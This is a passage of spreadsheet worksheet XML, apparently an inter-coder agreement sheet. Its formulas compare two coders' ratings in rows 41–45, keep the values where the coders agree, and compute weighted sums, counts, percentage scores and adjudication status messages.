        <f>IF(AND(Coder1!L41&amp;""&lt;&gt;"",Coder1!L41&amp;""=Coder2!L41&amp;""),Coder1!L41,"")</f>
        <v/>
      </c>
      <c r="M41" s="14">
        <f>IF(AND(Coder1!M41&amp;""&lt;&gt;"",Coder1!M41&amp;""=Coder2!M41&amp;""),Coder1!M41,"")</f>
        <v/>
      </c>
      <c r="N41" s="14">
        <f>IF(AND(Coder1!N41&amp;""&lt;&gt;"",Coder1!N41&amp;""=Coder2!N41&amp;""),Coder1!N41,"")</f>
        <v/>
      </c>
      <c r="O41" s="14">
        <f>IF(AND(Coder1!O41&amp;""&lt;&gt;"",Coder1!O41&amp;""=Coder2!O41&amp;""),Coder1!O41,"")</f>
        <v/>
      </c>
      <c r="P41" s="14">
        <f>IF(AND(Coder1!P41&amp;""&lt;&gt;"",Coder1!P41&amp;""=Coder2!P41&amp;""),Coder1!P41,"")</f>
        <v/>
      </c>
      <c r="Q41" s="14">
        <f>IF(AND(Coder1!Q41&amp;""&lt;&gt;"",Coder1!Q41&amp;""=Coder2!Q41&amp;""),Coder1!Q41,"")</f>
        <v/>
      </c>
      <c r="R41" s="14">
        <f>IF(AND(Coder1!R41&amp;""&lt;&gt;"",Coder1!R41&amp;""=Coder2!R41&amp;""),Coder1!R41,"")</f>
        <v/>
      </c>
      <c r="S41" s="14">
        <f>IF(AND(Coder1!S41&amp;""&lt;&gt;"",Coder1!S41&amp;""=Coder2!S41&amp;""),Coder1!S41,"")</f>
        <v/>
      </c>
      <c r="T41" s="14">
        <f>IF(AND(Coder1!T41&amp;""&lt;&gt;"",Coder1!T41&amp;""=Coder2!T41&amp;""),Coder1!T41,"")</f>
        <v/>
      </c>
      <c r="U41" s="14">
        <f>IF(AND(Coder1!U41&amp;""&lt;&gt;"",Coder1!U41&amp;""=Coder2!U41&amp;""),Coder1!U41,"")</f>
        <v/>
      </c>
      <c r="V41" s="14">
        <f>IF(AND(Coder1!V41&amp;""&lt;&gt;"",Coder1!V41&amp;""=Coder2!V41&amp;""),Coder1!V41,"")</f>
        <v/>
      </c>
      <c r="W41" s="14">
        <f>IF(AND(Coder1!W41&amp;""&lt;&gt;"",Coder1!W41&amp;""=Coder2!W41&amp;""),Coder1!W41,"")</f>
        <v/>
      </c>
      <c r="X41" s="14">
        <f>IF(AND(Coder1!X41&amp;""&lt;&gt;"",Coder1!X41&amp;""=Coder2!X41&amp;""),Coder1!X41,"")</f>
        <v/>
      </c>
      <c r="Y41" s="14">
        <f>IF(AND(Coder1!Y41&amp;""&lt;&gt;"",Coder1!Y41&amp;""=Coder2!Y41&amp;""),Coder1!Y41,"")</f>
        <v/>
      </c>
      <c r="Z41" s="14">
        <f>IF(AND(Coder1!Z41&amp;""&lt;&gt;"",Coder1!Z41&amp;""=Coder2!Z41&amp;""),Coder1!Z41,"")</f>
        <v/>
      </c>
      <c r="AA41" s="14">
        <f>IF(AND(Coder1!AA41&amp;""&lt;&gt;"",Coder1!AA41&amp;""=Coder2!AA41&amp;""),Coder1!AA41,"")</f>
        <v/>
      </c>
      <c r="AB41" s="14">
        <f>IF(AND(Coder1!AB41&amp;""&lt;&gt;"",Coder1!AB41&amp;""=Coder2!AB41&amp;""),Coder1!AB41,"")</f>
        <v/>
      </c>
      <c r="AC41" s="14">
        <f>IF(AND(Coder1!AC41&amp;""&lt;&gt;"",Coder1!AC41&amp;""=Coder2!AC41&amp;""),Coder1!AC41,"")</f>
        <v/>
      </c>
      <c r="AD41" s="14">
        <f>IF(AND(Coder1!AD41&amp;""&lt;&gt;"",Coder1!AD41&amp;""=Coder2!AD41&amp;""),Coder1!AD41,"")</f>
        <v/>
      </c>
      <c r="AE41" s="14">
        <f>IF(AND(Coder1!AE41&amp;""&lt;&gt;"",Coder1!AE41&amp;""=Coder2!AE41&amp;""),Coder1!AE41,"")</f>
        <v/>
      </c>
      <c r="AF41" s="14">
        <f>IF(AND(Coder1!AF41&amp;""&lt;&gt;"",Coder1!AF41&amp;""=Coder2!AF41&amp;""),Coder1!AF41,"")</f>
        <v/>
      </c>
      <c r="AG41" s="14">
        <f>IF(AND(Coder1!AG41&amp;""&lt;&gt;"",Coder1!AG41&amp;""=Coder2!AG41&amp;""),Coder1!AG41,"")</f>
        <v/>
      </c>
      <c r="AH41" s="14">
        <f>IF(AND(Coder1!AH41&amp;""&lt;&gt;"",Coder1!AH41&amp;""=Coder2!AH41&amp;""),Coder1!AH41,"")</f>
        <v/>
      </c>
      <c r="AI41" s="11">
        <f>IF(COUNT(E41:L41)=0,"",SUM(E41:L41))</f>
        <v/>
      </c>
      <c r="AJ41" s="11">
        <f>IF(AI41="","",N(E41)*3+N(F41)*2+N(G41)*2+N(H41)*2+N(I41)*2+N(J41)*3+N(K41)*3+N(L41)*3)</f>
        <v/>
      </c>
      <c r="AK41" s="11">
        <f>IF(AI41="","",COUNTIF(N41:AG41,1))</f>
        <v/>
      </c>
      <c r="AL41" s="11">
        <f>IF(OR(AJ41="",AJ41=0),"",ROUND(100*(AJ41-AK41)/AJ41,1))</f>
        <v/>
      </c>
      <c r="AM41" s="11">
        <f>IF(AND(Coder1!AN41=1,Coder2!AN41=1),IF(COUNTBLANK(E41:AH41)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN41" s="11">
        <f>IF(AND(Coder1!AN41=1,Coder2!AN41=1),IF(SUMPRODUCT(--(Coder1!E41:AH41&amp;""&lt;&gt;Coder2!E41:AH41&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO41" s="11" t="n"/>
    </row>
    <row r="42">
      <c r="A42" s="11">
        <f>Coder1!A42</f>
        <v/>
      </c>
      <c r="B42" s="11">
        <f>Coder1!B42</f>
        <v/>
      </c>
      <c r="C42" s="11">
        <f>Coder1!C42</f>
        <v/>
      </c>
      <c r="D42" s="11">
        <f>Coder1!D42</f>
        <v/>
      </c>
      <c r="E42" s="14">
        <f>IF(AND(Coder1!E42&amp;""&lt;&gt;"",Coder1!E42&amp;""=Coder2!E42&amp;""),Coder1!E42,"")</f>
        <v/>
      </c>
      <c r="F42" s="14">
        <f>IF(AND(Coder1!F42&amp;""&lt;&gt;"",Coder1!F42&amp;""=Coder2!F42&amp;""),Coder1!F42,"")</f>
        <v/>
      </c>
      <c r="G42" s="14">
        <f>IF(AND(Coder1!G42&amp;""&lt;&gt;"",Coder1!G42&amp;""=Coder2!G42&amp;""),Coder1!G42,"")</f>
        <v/>
      </c>
      <c r="H42" s="14">
        <f>IF(AND(Coder1!H42&amp;""&lt;&gt;"",Coder1!H42&amp;""=Coder2!H42&amp;""),Coder1!H42,"")</f>
        <v/>
      </c>
      <c r="I42" s="14">
        <f>IF(AND(Coder1!I42&amp;""&lt;&gt;"",Coder1!I42&amp;""=Coder2!I42&amp;""),Coder1!I42,"")</f>
        <v/>
      </c>
      <c r="J42" s="14">
        <f>IF(AND(Coder1!J42&amp;""&lt;&gt;"",Coder1!J42&amp;""=Coder2!J42&amp;""),Coder1!J42,"")</f>
        <v/>
      </c>
      <c r="K42" s="14">
        <f>IF(AND(Coder1!K42&amp;""&lt;&gt;"",Coder1!K42&amp;""=Coder2!K42&amp;""),Coder1!K42,"")</f>
        <v/>
      </c>
      <c r="L42" s="14">
        <f>IF(AND(Coder1!L42&amp;""&lt;&gt;"",Coder1!L42&amp;""=Coder2!L42&amp;""),Coder1!L42,"")</f>
        <v/>
      </c>
      <c r="M42" s="14">
        <f>IF(AND(Coder1!M42&amp;""&lt;&gt;"",Coder1!M42&amp;""=Coder2!M42&amp;""),Coder1!M42,"")</f>
        <v/>
      </c>
      <c r="N42" s="14">
        <f>IF(AND(Coder1!N42&amp;""&lt;&gt;"",Coder1!N42&amp;""=Coder2!N42&amp;""),Coder1!N42,"")</f>
        <v/>
      </c>
      <c r="O42" s="14">
        <f>IF(AND(Coder1!O42&amp;""&lt;&gt;"",Coder1!O42&amp;""=Coder2!O42&amp;""),Coder1!O42,"")</f>
        <v/>
      </c>
      <c r="P42" s="14">
        <f>IF(AND(Coder1!P42&amp;""&lt;&gt;"",Coder1!P42&amp;""=Coder2!P42&amp;""),Coder1!P42,"")</f>
        <v/>
      </c>
      <c r="Q42" s="14">
        <f>IF(AND(Coder1!Q42&amp;""&lt;&gt;"",Coder1!Q42&amp;""=Coder2!Q42&amp;""),Coder1!Q42,"")</f>
        <v/>
      </c>
      <c r="R42" s="14">
        <f>IF(AND(Coder1!R42&amp;""&lt;&gt;"",Coder1!R42&amp;""=Coder2!R42&amp;""),Coder1!R42,"")</f>
        <v/>
      </c>
      <c r="S42" s="14">
        <f>IF(AND(Coder1!S42&amp;""&lt;&gt;"",Coder1!S42&amp;""=Coder2!S42&amp;""),Coder1!S42,"")</f>
        <v/>
      </c>
      <c r="T42" s="14">
        <f>IF(AND(Coder1!T42&amp;""&lt;&gt;"",Coder1!T42&amp;""=Coder2!T42&amp;""),Coder1!T42,"")</f>
        <v/>
      </c>
      <c r="U42" s="14">
        <f>IF(AND(Coder1!U42&amp;""&lt;&gt;"",Coder1!U42&amp;""=Coder2!U42&amp;""),Coder1!U42,"")</f>
        <v/>
      </c>
      <c r="V42" s="14">
        <f>IF(AND(Coder1!V42&amp;""&lt;&gt;"",Coder1!V42&amp;""=Coder2!V42&amp;""),Coder1!V42,"")</f>
        <v/>
      </c>
      <c r="W42" s="14">
        <f>IF(AND(Coder1!W42&amp;""&lt;&gt;"",Coder1!W42&amp;""=Coder2!W42&amp;""),Coder1!W42,"")</f>
        <v/>
      </c>
      <c r="X42" s="14">
        <f>IF(AND(Coder1!X42&amp;""&lt;&gt;"",Coder1!X42&amp;""=Coder2!X42&amp;""),Coder1!X42,"")</f>
        <v/>
      </c>
      <c r="Y42" s="14">
        <f>IF(AND(Coder1!Y42&amp;""&lt;&gt;"",Coder1!Y42&amp;""=Coder2!Y42&amp;""),Coder1!Y42,"")</f>
        <v/>
      </c>
      <c r="Z42" s="14">
        <f>IF(AND(Coder1!Z42&amp;""&lt;&gt;"",Coder1!Z42&amp;""=Coder2!Z42&amp;""),Coder1!Z42,"")</f>
        <v/>
      </c>
      <c r="AA42" s="14">
        <f>IF(AND(Coder1!AA42&amp;""&lt;&gt;"",Coder1!AA42&amp;""=Coder2!AA42&amp;""),Coder1!AA42,"")</f>
        <v/>
      </c>
      <c r="AB42" s="14">
        <f>IF(AND(Coder1!AB42&amp;""&lt;&gt;"",Coder1!AB42&amp;""=Coder2!AB42&amp;""),Coder1!AB42,"")</f>
        <v/>
      </c>
      <c r="AC42" s="14">
        <f>IF(AND(Coder1!AC42&amp;""&lt;&gt;"",Coder1!AC42&amp;""=Coder2!AC42&amp;""),Coder1!AC42,"")</f>
        <v/>
      </c>
      <c r="AD42" s="14">
        <f>IF(AND(Coder1!AD42&amp;""&lt;&gt;"",Coder1!AD42&amp;""=Coder2!AD42&amp;""),Coder1!AD42,"")</f>
        <v/>
      </c>
      <c r="AE42" s="14">
        <f>IF(AND(Coder1!AE42&amp;""&lt;&gt;"",Coder1!AE42&amp;""=Coder2!AE42&amp;""),Coder1!AE42,"")</f>
        <v/>
      </c>
      <c r="AF42" s="14">
        <f>IF(AND(Coder1!AF42&amp;""&lt;&gt;"",Coder1!AF42&amp;""=Coder2!AF42&amp;""),Coder1!AF42,"")</f>
        <v/>
      </c>
      <c r="AG42" s="14">
        <f>IF(AND(Coder1!AG42&amp;""&lt;&gt;"",Coder1!AG42&amp;""=Coder2!AG42&amp;""),Coder1!AG42,"")</f>
        <v/>
      </c>
      <c r="AH42" s="14">
        <f>IF(AND(Coder1!AH42&amp;""&lt;&gt;"",Coder1!AH42&amp;""=Coder2!AH42&amp;""),Coder1!AH42,"")</f>
        <v/>
      </c>
      <c r="AI42" s="11">
        <f>IF(COUNT(E42:L42)=0,"",SUM(E42:L42))</f>
        <v/>
      </c>
      <c r="AJ42" s="11">
        <f>IF(AI42="","",N(E42)*3+N(F42)*2+N(G42)*2+N(H42)*2+N(I42)*2+N(J42)*3+N(K42)*3+N(L42)*3)</f>
        <v/>
      </c>
      <c r="AK42" s="11">
        <f>IF(AI42="","",COUNTIF(N42:AG42,1))</f>
        <v/>
      </c>
      <c r="AL42" s="11">
        <f>IF(OR(AJ42="",AJ42=0),"",ROUND(100*(AJ42-AK42)/AJ42,1))</f>
        <v/>
      </c>
      <c r="AM42" s="11">
        <f>IF(AND(Coder1!AN42=1,Coder2!AN42=1),IF(COUNTBLANK(E42:AH42)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN42" s="11">
        <f>IF(AND(Coder1!AN42=1,Coder2!AN42=1),IF(SUMPRODUCT(--(Coder1!E42:AH42&amp;""&lt;&gt;Coder2!E42:AH42&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO42" s="11" t="n"/>
    </row>
    <row r="43">
      <c r="A43" s="11">
        <f>Coder1!A43</f>
        <v/>
      </c>
      <c r="B43" s="11">
        <f>Coder1!B43</f>
        <v/>
      </c>
      <c r="C43" s="11">
        <f>Coder1!C43</f>
        <v/>
      </c>
      <c r="D43" s="11">
        <f>Coder1!D43</f>
        <v/>
      </c>
      <c r="E43" s="14">
        <f>IF(AND(Coder1!E43&amp;""&lt;&gt;"",Coder1!E43&amp;""=Coder2!E43&amp;""),Coder1!E43,"")</f>
        <v/>
      </c>
      <c r="F43" s="14">
        <f>IF(AND(Coder1!F43&amp;""&lt;&gt;"",Coder1!F43&amp;""=Coder2!F43&amp;""),Coder1!F43,"")</f>
        <v/>
      </c>
      <c r="G43" s="14">
        <f>IF(AND(Coder1!G43&amp;""&lt;&gt;"",Coder1!G43&amp;""=Coder2!G43&amp;""),Coder1!G43,"")</f>
        <v/>
      </c>
      <c r="H43" s="14">
        <f>IF(AND(Coder1!H43&amp;""&lt;&gt;"",Coder1!H43&amp;""=Coder2!H43&amp;""),Coder1!H43,"")</f>
        <v/>
      </c>
      <c r="I43" s="14">
        <f>IF(AND(Coder1!I43&amp;""&lt;&gt;"",Coder1!I43&amp;""=Coder2!I43&amp;""),Coder1!I43,"")</f>
        <v/>
      </c>
      <c r="J43" s="14">
        <f>IF(AND(Coder1!J43&amp;""&lt;&gt;"",Coder1!J43&amp;""=Coder2!J43&amp;""),Coder1!J43,"")</f>
        <v/>
      </c>
      <c r="K43" s="14">
        <f>IF(AND(Coder1!K43&amp;""&lt;&gt;"",Coder1!K43&amp;""=Coder2!K43&amp;""),Coder1!K43,"")</f>
        <v/>
      </c>
      <c r="L43" s="14">
        <f>IF(AND(Coder1!L43&amp;""&lt;&gt;"",Coder1!L43&amp;""=Coder2!L43&amp;""),Coder1!L43,"")</f>
        <v/>
      </c>
      <c r="M43" s="14">
        <f>IF(AND(Coder1!M43&amp;""&lt;&gt;"",Coder1!M43&amp;""=Coder2!M43&amp;""),Coder1!M43,"")</f>
        <v/>
      </c>
      <c r="N43" s="14">
        <f>IF(AND(Coder1!N43&amp;""&lt;&gt;"",Coder1!N43&amp;""=Coder2!N43&amp;""),Coder1!N43,"")</f>
        <v/>
      </c>
      <c r="O43" s="14">
        <f>IF(AND(Coder1!O43&amp;""&lt;&gt;"",Coder1!O43&amp;""=Coder2!O43&amp;""),Coder1!O43,"")</f>
        <v/>
      </c>
      <c r="P43" s="14">
        <f>IF(AND(Coder1!P43&amp;""&lt;&gt;"",Coder1!P43&amp;""=Coder2!P43&amp;""),Coder1!P43,"")</f>
        <v/>
      </c>
      <c r="Q43" s="14">
        <f>IF(AND(Coder1!Q43&amp;""&lt;&gt;"",Coder1!Q43&amp;""=Coder2!Q43&amp;""),Coder1!Q43,"")</f>
        <v/>
      </c>
      <c r="R43" s="14">
        <f>IF(AND(Coder1!R43&amp;""&lt;&gt;"",Coder1!R43&amp;""=Coder2!R43&amp;""),Coder1!R43,"")</f>
        <v/>
      </c>
      <c r="S43" s="14">
        <f>IF(AND(Coder1!S43&amp;""&lt;&gt;"",Coder1!S43&amp;""=Coder2!S43&amp;""),Coder1!S43,"")</f>
        <v/>
      </c>
      <c r="T43" s="14">
        <f>IF(AND(Coder1!T43&amp;""&lt;&gt;"",Coder1!T43&amp;""=Coder2!T43&amp;""),Coder1!T43,"")</f>
        <v/>
      </c>
      <c r="U43" s="14">
        <f>IF(AND(Coder1!U43&amp;""&lt;&gt;"",Coder1!U43&amp;""=Coder2!U43&amp;""),Coder1!U43,"")</f>
        <v/>
      </c>
      <c r="V43" s="14">
        <f>IF(AND(Coder1!V43&amp;""&lt;&gt;"",Coder1!V43&amp;""=Coder2!V43&amp;""),Coder1!V43,"")</f>
        <v/>
      </c>
      <c r="W43" s="14">
        <f>IF(AND(Coder1!W43&amp;""&lt;&gt;"",Coder1!W43&amp;""=Coder2!W43&amp;""),Coder1!W43,"")</f>
        <v/>
      </c>
      <c r="X43" s="14">
        <f>IF(AND(Coder1!X43&amp;""&lt;&gt;"",Coder1!X43&amp;""=Coder2!X43&amp;""),Coder1!X43,"")</f>
        <v/>
      </c>
      <c r="Y43" s="14">
        <f>IF(AND(Coder1!Y43&amp;""&lt;&gt;"",Coder1!Y43&amp;""=Coder2!Y43&amp;""),Coder1!Y43,"")</f>
        <v/>
      </c>
      <c r="Z43" s="14">
        <f>IF(AND(Coder1!Z43&amp;""&lt;&gt;"",Coder1!Z43&amp;""=Coder2!Z43&amp;""),Coder1!Z43,"")</f>
        <v/>
      </c>
      <c r="AA43" s="14">
        <f>IF(AND(Coder1!AA43&amp;""&lt;&gt;"",Coder1!AA43&amp;""=Coder2!AA43&amp;""),Coder1!AA43,"")</f>
        <v/>
      </c>
      <c r="AB43" s="14">
        <f>IF(AND(Coder1!AB43&amp;""&lt;&gt;"",Coder1!AB43&amp;""=Coder2!AB43&amp;""),Coder1!AB43,"")</f>
        <v/>
      </c>
      <c r="AC43" s="14">
        <f>IF(AND(Coder1!AC43&amp;""&lt;&gt;"",Coder1!AC43&amp;""=Coder2!AC43&amp;""),Coder1!AC43,"")</f>
        <v/>
      </c>
      <c r="AD43" s="14">
        <f>IF(AND(Coder1!AD43&amp;""&lt;&gt;"",Coder1!AD43&amp;""=Coder2!AD43&amp;""),Coder1!AD43,"")</f>
        <v/>
      </c>
      <c r="AE43" s="14">
        <f>IF(AND(Coder1!AE43&amp;""&lt;&gt;"",Coder1!AE43&amp;""=Coder2!AE43&amp;""),Coder1!AE43,"")</f>
        <v/>
      </c>
      <c r="AF43" s="14">
        <f>IF(AND(Coder1!AF43&amp;""&lt;&gt;"",Coder1!AF43&amp;""=Coder2!AF43&amp;""),Coder1!AF43,"")</f>
        <v/>
      </c>
      <c r="AG43" s="14">
        <f>IF(AND(Coder1!AG43&amp;""&lt;&gt;"",Coder1!AG43&amp;""=Coder2!AG43&amp;""),Coder1!AG43,"")</f>
        <v/>
      </c>
      <c r="AH43" s="14">
        <f>IF(AND(Coder1!AH43&amp;""&lt;&gt;"",Coder1!AH43&amp;""=Coder2!AH43&amp;""),Coder1!AH43,"")</f>
        <v/>
      </c>
      <c r="AI43" s="11">
        <f>IF(COUNT(E43:L43)=0,"",SUM(E43:L43))</f>
        <v/>
      </c>
      <c r="AJ43" s="11">
        <f>IF(AI43="","",N(E43)*3+N(F43)*2+N(G43)*2+N(H43)*2+N(I43)*2+N(J43)*3+N(K43)*3+N(L43)*3)</f>
        <v/>
      </c>
      <c r="AK43" s="11">
        <f>IF(AI43="","",COUNTIF(N43:AG43,1))</f>
        <v/>
      </c>
      <c r="AL43" s="11">
        <f>IF(OR(AJ43="",AJ43=0),"",ROUND(100*(AJ43-AK43)/AJ43,1))</f>
        <v/>
      </c>
      <c r="AM43" s="11">
        <f>IF(AND(Coder1!AN43=1,Coder2!AN43=1),IF(COUNTBLANK(E43:AH43)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN43" s="11">
        <f>IF(AND(Coder1!AN43=1,Coder2!AN43=1),IF(SUMPRODUCT(--(Coder1!E43:AH43&amp;""&lt;&gt;Coder2!E43:AH43&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO43" s="11" t="n"/>
    </row>
    <row r="44">
      <c r="A44" s="11">
        <f>Coder1!A44</f>
        <v/>
      </c>
      <c r="B44" s="11">
        <f>Coder1!B44</f>
        <v/>
      </c>
      <c r="C44" s="11">
        <f>Coder1!C44</f>
        <v/>
      </c>
      <c r="D44" s="11">
        <f>Coder1!D44</f>
        <v/>
      </c>
      <c r="E44" s="14">
        <f>IF(AND(Coder1!E44&amp;""&lt;&gt;"",Coder1!E44&amp;""=Coder2!E44&amp;""),Coder1!E44,"")</f>
        <v/>
      </c>
      <c r="F44" s="14">
        <f>IF(AND(Coder1!F44&amp;""&lt;&gt;"",Coder1!F44&amp;""=Coder2!F44&amp;""),Coder1!F44,"")</f>
        <v/>
      </c>
      <c r="G44" s="14">
        <f>IF(AND(Coder1!G44&amp;""&lt;&gt;"",Coder1!G44&amp;""=Coder2!G44&amp;""),Coder1!G44,"")</f>
        <v/>
      </c>
      <c r="H44" s="14">
        <f>IF(AND(Coder1!H44&amp;""&lt;&gt;"",Coder1!H44&amp;""=Coder2!H44&amp;""),Coder1!H44,"")</f>
        <v/>
      </c>
      <c r="I44" s="14">
        <f>IF(AND(Coder1!I44&amp;""&lt;&gt;"",Coder1!I44&amp;""=Coder2!I44&amp;""),Coder1!I44,"")</f>
        <v/>
      </c>
      <c r="J44" s="14">
        <f>IF(AND(Coder1!J44&amp;""&lt;&gt;"",Coder1!J44&amp;""=Coder2!J44&amp;""),Coder1!J44,"")</f>
        <v/>
      </c>
      <c r="K44" s="14">
        <f>IF(AND(Coder1!K44&amp;""&lt;&gt;"",Coder1!K44&amp;""=Coder2!K44&amp;""),Coder1!K44,"")</f>
        <v/>
      </c>
      <c r="L44" s="14">
        <f>IF(AND(Coder1!L44&amp;""&lt;&gt;"",Coder1!L44&amp;""=Coder2!L44&amp;""),Coder1!L44,"")</f>
        <v/>
      </c>
      <c r="M44" s="14">
        <f>IF(AND(Coder1!M44&amp;""&lt;&gt;"",Coder1!M44&amp;""=Coder2!M44&amp;""),Coder1!M44,"")</f>
        <v/>
      </c>
      <c r="N44" s="14">
        <f>IF(AND(Coder1!N44&amp;""&lt;&gt;"",Coder1!N44&amp;""=Coder2!N44&amp;""),Coder1!N44,"")</f>
        <v/>
      </c>
      <c r="O44" s="14">
        <f>IF(AND(Coder1!O44&amp;""&lt;&gt;"",Coder1!O44&amp;""=Coder2!O44&amp;""),Coder1!O44,"")</f>
        <v/>
      </c>
      <c r="P44" s="14">
        <f>IF(AND(Coder1!P44&amp;""&lt;&gt;"",Coder1!P44&amp;""=Coder2!P44&amp;""),Coder1!P44,"")</f>
        <v/>
      </c>
      <c r="Q44" s="14">
        <f>IF(AND(Coder1!Q44&amp;""&lt;&gt;"",Coder1!Q44&amp;""=Coder2!Q44&amp;""),Coder1!Q44,"")</f>
        <v/>
      </c>
      <c r="R44" s="14">
        <f>IF(AND(Coder1!R44&amp;""&lt;&gt;"",Coder1!R44&amp;""=Coder2!R44&amp;""),Coder1!R44,"")</f>
        <v/>
      </c>
      <c r="S44" s="14">
        <f>IF(AND(Coder1!S44&amp;""&lt;&gt;"",Coder1!S44&amp;""=Coder2!S44&amp;""),Coder1!S44,"")</f>
        <v/>
      </c>
      <c r="T44" s="14">
        <f>IF(AND(Coder1!T44&amp;""&lt;&gt;"",Coder1!T44&amp;""=Coder2!T44&amp;""),Coder1!T44,"")</f>
        <v/>
      </c>
      <c r="U44" s="14">
        <f>IF(AND(Coder1!U44&amp;""&lt;&gt;"",Coder1!U44&amp;""=Coder2!U44&amp;""),Coder1!U44,"")</f>
        <v/>
      </c>
      <c r="V44" s="14">
        <f>IF(AND(Coder1!V44&amp;""&lt;&gt;"",Coder1!V44&amp;""=Coder2!V44&amp;""),Coder1!V44,"")</f>
        <v/>
      </c>
      <c r="W44" s="14">
        <f>IF(AND(Coder1!W44&amp;""&lt;&gt;"",Coder1!W44&amp;""=Coder2!W44&amp;""),Coder1!W44,"")</f>
        <v/>
      </c>
      <c r="X44" s="14">
        <f>IF(AND(Coder1!X44&amp;""&lt;&gt;"",Coder1!X44&amp;""=Coder2!X44&amp;""),Coder1!X44,"")</f>
        <v/>
      </c>
      <c r="Y44" s="14">
        <f>IF(AND(Coder1!Y44&amp;""&lt;&gt;"",Coder1!Y44&amp;""=Coder2!Y44&amp;""),Coder1!Y44,"")</f>
        <v/>
      </c>
      <c r="Z44" s="14">
        <f>IF(AND(Coder1!Z44&amp;""&lt;&gt;"",Coder1!Z44&amp;""=Coder2!Z44&amp;""),Coder1!Z44,"")</f>
        <v/>
      </c>
      <c r="AA44" s="14">
        <f>IF(AND(Coder1!AA44&amp;""&lt;&gt;"",Coder1!AA44&amp;""=Coder2!AA44&amp;""),Coder1!AA44,"")</f>
        <v/>
      </c>
      <c r="AB44" s="14">
        <f>IF(AND(Coder1!AB44&amp;""&lt;&gt;"",Coder1!AB44&amp;""=Coder2!AB44&amp;""),Coder1!AB44,"")</f>
        <v/>
      </c>
      <c r="AC44" s="14">
        <f>IF(AND(Coder1!AC44&amp;""&lt;&gt;"",Coder1!AC44&amp;""=Coder2!AC44&amp;""),Coder1!AC44,"")</f>
        <v/>
      </c>
      <c r="AD44" s="14">
        <f>IF(AND(Coder1!AD44&amp;""&lt;&gt;"",Coder1!AD44&amp;""=Coder2!AD44&amp;""),Coder1!AD44,"")</f>
        <v/>
      </c>
      <c r="AE44" s="14">
        <f>IF(AND(Coder1!AE44&amp;""&lt;&gt;"",Coder1!AE44&amp;""=Coder2!AE44&amp;""),Coder1!AE44,"")</f>
        <v/>
      </c>
      <c r="AF44" s="14">
        <f>IF(AND(Coder1!AF44&amp;""&lt;&gt;"",Coder1!AF44&amp;""=Coder2!AF44&amp;""),Coder1!AF44,"")</f>
        <v/>
      </c>
      <c r="AG44" s="14">
        <f>IF(AND(Coder1!AG44&amp;""&lt;&gt;"",Coder1!AG44&amp;""=Coder2!AG44&amp;""),Coder1!AG44,"")</f>
        <v/>
      </c>
      <c r="AH44" s="14">
        <f>IF(AND(Coder1!AH44&amp;""&lt;&gt;"",Coder1!AH44&amp;""=Coder2!AH44&amp;""),Coder1!AH44,"")</f>
        <v/>
      </c>
      <c r="AI44" s="11">
        <f>IF(COUNT(E44:L44)=0,"",SUM(E44:L44))</f>
        <v/>
      </c>
      <c r="AJ44" s="11">
        <f>IF(AI44="","",N(E44)*3+N(F44)*2+N(G44)*2+N(H44)*2+N(I44)*2+N(J44)*3+N(K44)*3+N(L44)*3)</f>
        <v/>
      </c>
      <c r="AK44" s="11">
        <f>IF(AI44="","",COUNTIF(N44:AG44,1))</f>
        <v/>
      </c>
      <c r="AL44" s="11">
        <f>IF(OR(AJ44="",AJ44=0),"",ROUND(100*(AJ44-AK44)/AJ44,1))</f>
        <v/>
      </c>
      <c r="AM44" s="11">
        <f>IF(AND(Coder1!AN44=1,Coder2!AN44=1),IF(COUNTBLANK(E44:AH44)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN44" s="11">
        <f>IF(AND(Coder1!AN44=1,Coder2!AN44=1),IF(SUMPRODUCT(--(Coder1!E44:AH44&amp;""&lt;&gt;Coder2!E44:AH44&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO44" s="11" t="n"/>
    </row>
    <row r="45">
      <c r="A45" s="11">
        <f>Coder1!A45</f>
        <v/>
      </c>
      <c r="B45" s="11">
        <f>Coder1!B45</f>
        <v/>
      </c>
      <c r="C45" s="11">
        <f>Coder1!C45</f>
        <v/>
      </c>
      <c r="D45" s="11">
        <f>Coder1!D45</f>
        <v/>
      </c>
      <c r="E45" s="14">
        <f>IF(AND(Coder1!E45&amp;""&lt;&gt;"",Coder1!E45&amp;""=Coder2!E45&amp;""),Coder1!E45,"")</f>
        <v/>
      </c>
      <c r="F45" s="14">
        <f>IF(AND(Coder1!F45&amp;""&lt;&gt;"",Coder1!F45&amp;""=Coder2!F45&amp;""),Coder1!F45,"")</f>
        <v/>
      </c>
      <c r="G45" s="14">
        <f>IF(AND(Coder1!G45&amp;""&lt;&gt;"",Coder1!G45&amp;""=Coder2!G45&amp;""),Coder1!G45,"")</f>
        <v/>
      </c>
      <c r="H45" s="14">
        <f>IF(AND(Coder1!H45&amp;""&lt;&gt;"",Coder1!H45&amp;""=Coder2!H45&amp;""),Coder1!H45,"")</f>
        <v/>
      </c>
      <c r="I45" s="14">
        <f>IF(AND(Coder1!I45&amp;""&lt;&gt;"",Coder1!I45&amp;""=Coder2!I45&amp;""),Coder1!I45,"")</f>
        <v/>
      </c>
      <c r="J45" s="14">
        <f>IF(AND(Coder1!J45&amp;""&lt;&gt;"",Coder1!J45&amp;""=Coder2!J45&amp;""),Coder1!J45,"")</f>
        <v/>
      </c>
      <c r="K45" s="14">
        <f>IF(AND(Coder1!K45&amp;""&lt;&gt;"",Coder1!K45&amp;""=Coder2!K45&amp;""),Coder1!K45,"")</f>
        <v/>
      </c>
      <c r="L45" s="14">
        <f>IF(AND(Coder1!L45&amp;""&lt;&gt;"",Coder1!L45&amp;""=Coder2!L45&amp;""),Coder1!L45,"")</f>
        <v/>
      </c>
      <c r="M45" s="14">
        <f>IF(AND(Coder1!M45&amp;""&lt;&gt;"",Coder1!M45&amp;""=Coder2!M45&amp;""),Coder1!M45,"")</f>
        <v/>
      </c>
      <c r="N45" s="14">
        <f>IF(AND(Coder1!N45&amp;""&lt;&gt;"",Coder1!N45&amp;""=Coder2!N45&amp;""),Coder1!N45,"")</f>
        <v/>
      </c>
      <c r="O45" s="14">
